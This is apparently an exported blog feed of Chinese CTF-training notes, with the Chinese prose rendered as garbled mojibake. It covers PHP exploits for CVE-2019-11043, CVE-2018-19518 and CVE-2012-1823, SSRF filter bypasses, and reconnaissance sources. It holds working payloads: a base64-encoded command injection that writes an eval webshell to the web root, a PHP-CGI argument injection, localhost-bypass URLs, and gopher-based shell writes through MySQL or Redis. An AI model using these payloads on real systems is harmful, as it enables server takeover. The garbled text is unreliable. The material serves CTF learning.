(<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>) || !is_file(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> ord(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="CVE-2019-11043"><a href="#CVE-2019-11043" class="headerlink" title="CVE-2019-11043"></a>CVE-2019-11043</h2><p>å®‰è£…goç¯å¢ƒï¼Œ<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a><br>tar -xzf go.tar.gz -c /usr/local<br>é…ç½®goç¯å¢ƒå˜é‡<br>export PATH=$PATH:/usr/local/go/bin<br>ä½¿ä¹‹ç”Ÿæ•ˆ source /etc/profile<br>æ£€æŸ¥goç¯å¢ƒï¼šgo version<br>å®‰è£…æ¼æ´æ£€æµ‹å·¥å…·<br>git clone <a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a><br>cd /phuip-fpizdam<br>go install phuip-fpizdam//å¯èƒ½å› ä¸ºç½‘ç»œåŸå› ä¸‹è½½ä¸æˆåŠŸ<br>è®¾ç½®ä¸€ä¸‹goçš„ä»£ç†<br>go env -w GOPROXY=<a href="https://goproxy.cn/">https://goproxy.cn</a><br>go install phuip-fpizdam<br>æŠ¥ä¸€äº›ç¯å¢ƒé—®é¢˜çš„å¯ä»¥å†è¯•è¯•</p><blockquote><p>export GOBIN=$GOPATH/bin<br>export PATH=$PATH:$GOBIN</p></blockquote><p>ä½¿ç”¨ï¼š</p><blockquote><p>./phuip-fpizdam url/index.php</p></blockquote><p>åˆ©ç”¨å¯èƒ½ä¸æˆåŠŸï¼Œå¤šè¯•ä¸€è¯•ä¸Šé¢çš„è¯­å¥ï¼ŒæˆåŠŸå¦‚å›¾<br><img src="https://img-blog.csdnimg.cn/a4a271f96f8f45df9c7080c626bb9cb2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZW5oZW5nelo=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€ååœ¨ â€¦/index.php?a=ls åŒæ ·ï¼Œå¤šæ‰§è¡Œå‡ æ¬¡</p><h2 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h2><p>post</p><blockquote><p>hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sL2UucGhw|base64%09-d|sh}a&amp;username=222&amp;password=333</p></blockquote><p>e.php postï¼š1</p><h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><p>PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œ</p><p>CGIæ¨¡å¼ä¸‹çš„å‚æ•°ï¼š</p><ul><li>-c æŒ‡å®šphp.iniæ–‡ä»¶çš„ä½ç½®</li><li>-n ä¸è¦åŠ è½½php.iniæ–‡ä»¶</li><li>-d æŒ‡å®šé…ç½®é¡¹</li><li>-b å¯åŠ¨fastcgiè¿›ç¨‹</li><li>-s æ˜¾ç¤ºæ–‡ä»¶æºç </li><li>-T æ‰§è¡ŒæŒ‡å®šæ¬¡è¯¥æ–‡ä»¶</li><li>-hå’Œ-ï¼Ÿ æ˜¾ç¤ºå¸®åŠ©</li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211151546579.png"><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211152502004.png"><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211152508973.png" alt="image-20220211152508973"></p><blockquote><p>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2020/11/20/ssrf/"/>
    <url>/2020/11/20/ssrf/</url>
    
    <content type="html"><![CDATA[<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>curl_init åˆå§‹åŒ– curl ä¼šè¯</p><p>curl_setopt è®¾ç½® curl ä¼ è¾“é€‰é¡¹ï¼ŒCURLOPT_HEADER å¯ç”¨æ—¶ä¼šå°†å¤´æ–‡ä»¶çš„ä¿¡æ¯ä½œä¸ºæ•°æ®æµè¾“å‡ºï¼›CURLOPT_RETURNTRANSFER ä¸º true æ—¶å°† curl_exec()è·å–çš„ä¿¡æ¯ä»¥å­—ç¬¦ä¸²è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚</p><p>curl_exec($sh)æŠ“å– URL å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨</p><p><a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127\.0\.|\ã€‚/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((strlen(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123; <span class="hljs-comment">//strlen($host)&lt;=3</span><br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¼€å§‹è¿‡æ»¤äº†ï¼Œæ–¹æ³•æœ‰ï¼š</p><ul><li><p>IP Bypass</p><p>127.0.0.1 ä½¿ç”¨çš„æ˜¯ç‚¹åˆ†åè¿›åˆ¶ ç»•è¿‡å¦‚ä¸‹</p></li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>è¿›åˆ¶æ ¼å¼ï¼š<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>è¿›åˆ¶æ ¼å¼ï¼š<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š<span class="hljs-number">2130706433</span><br><br>ç‰¹åˆ«çš„ï¼Œåœ¨linuxä¸‹ï¼Œ<span class="hljs-number">0</span>ä»£è¡¨<span class="hljs-number">127.0.0.1</span>ï¼Œå¯ä»¥ç”¨http://<span class="hljs-number">0</span>è¿›è¡Œè¯·æ±‚<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>8 è¿›åˆ¶<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center"><br>16 è¿›åˆ¶<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center"><br>10 è¿›åˆ¶æ•´æ•°ï¼š<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center"><br>linuxï¼š<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center"></p><blockquote><p>127.0.1 ã€127.1ã€ 127ã€‚0.0.1 æˆ–è€…è½¬æˆ 2 è¿›åˆ¶</p><p><a href="http://sudo.cc/">http://sudo.cc/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = gethostbyname(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!filter_var(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211117221246468.png"></p><p>var_filter ä¼šæ£€æŸ¥ä¸æ˜¯ç§æœ‰åœ°å€ï¼ŒDNS é‡ç»‘å®šæ²¡æœ‰å¤ç°æˆåŠŸ</p><p>æµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//header(&quot;Location:www.baidu.com&quot;);</span><br>header(<span class="hljs-string">&quot;Location:404 Not Found&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°æœåŠ¡å™¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>header ä¼šå‘é€åŸç”Ÿ http å¤´ï¼Œä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä¸Šé¢ä»£ç å°±æ˜¯ç”¨ js çš„ Location å±æ€§è·³è½¬åˆ° 127.0.0.1/flag.phpï¼Œç„¶åè¢« header å‘å›</p><p>é¢„æœŸè§£ï¼š</p><ul><li>DNS é‡ç»‘å®š</li></ul><p><a href="http://xip.io/">http://xip.io/</a></p><p><a href="http://ceye.io/">http://ceye.io/</a></p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>URL bypass</li></ul><p>å°è¯•å¤¹æ‚@ # / \ ?ï¼Œè¯¦è§<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">blackhat å³°ä¼š</a>å¤§ä½¬æåˆ°çš„<code>parse_url</code>è§£æé—®é¢˜</p><p>éœ€è¦ä»¥<code>http://ctf.</code>å¼€å¤´<code>show</code>ç»“å°¾</p><blockquote><p>url=<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p></blockquote><ul><li>gopherus</li></ul><p>mysql å†™é©¬</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211117234343142.png"></p><p>å°†<code>gopher://127.0.0.1:3306/_</code>åé¢å†ç¼–ç ä¸€æ¬¡ï¼Œbp å‘åŒ…ï¼Œshell ä¼ ä¸Š</p><p>redis åŒç†</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¿¡æ¯æ”¶é›†åŸºç¡€ç¯‡</title>
    <link href="/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>721ç¬¬äºŒæ¬¡åŸ¹è®­:<br>ä¿¡æ¯æ”¶é›†åŒ…æ‹¬ä¸»åŠ¨ä»¥åŠè¢«åŠ¨</p><p>æœ¬æ¬¡ä»»åŠ¡æœ‰ï¼šåˆ†åˆ«ç”¨c è¯­è¨€å’Œphpå†™ 99 ä¹˜æ³•è¡¨ï¼Œcsdnå†™åšå®¢ï¼ˆå¦ï¼šä¸‹æ˜ŸæœŸç”±æˆ‘åˆ†äº«win-doså†…å®¹ï¼‰</p><h2 id="1-è¢«åŠ¨ä¿¡æ¯æ”¶é›†"><a href="#1-è¢«åŠ¨ä¿¡æ¯æ”¶é›†" class="headerlink" title="1.è¢«åŠ¨ä¿¡æ¯æ”¶é›†"></a>1.è¢«åŠ¨ä¿¡æ¯æ”¶é›†</h2><p>åŸŸåä¿¡æ¯æŸ¥è¯¢ï¼ˆ<a href="https://www.aizhan.com/">çˆ±ç«™ç½‘</a> <a href="http://tool.chinaz.com/">ç«™é•¿å·¥å…·</a>ï¼‰<br> ä¼ä¸šä¿¡æ¯æŸ¥è¯¢ï¼ˆ<a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥</a> <a href="http://www.beian.gov.cn/portal/recordQuery">å…¬å®‰éƒ¨å¤‡æ¡ˆæŸ¥è¯¢</a>ï¼‰<br>Githubå¹³å°ï¼šæ³„éœ²æºç ã€æ•°æ®åº“ã€é‚®ç®±ã€ftpã€sshã€ç«¯å£3389ã€ä¸ªäººä¿¡æ¯ã€å…¶ä»–æ•æ„Ÿä¿¡æ¯</p><p>svnä¿¡æ¯ã€é‚®ä»¶ä¿¡æ¯ï¼ˆé€šè¿‡çˆ¬è™«ã€æœç´¢å¼•æ“è·å–æš´éœ²çš„é‚®ç®±ï¼Œé‚®ä»¶ä¿¡æ¯æ”¶é›†ç½‘ç«™<a href="http://www.skymem.info/">1</a> <a href="http://www.hunter.io/">2</a> <a href="http://email-format.com/">3</a>ï¼‰</p><p>Google Hacking<br><img src="https://img-blog.csdnimg.cn/2020112000430989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>Shodan Hacking<br><img src="https://img-blog.csdnimg.cn/20201120004349809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><p>é’Ÿé¦—ä¹‹çœ¼-Zoomeye Hacking<br><img src="https://img-blog.csdnimg.cn/2020112000442964.png#pic_center"><img 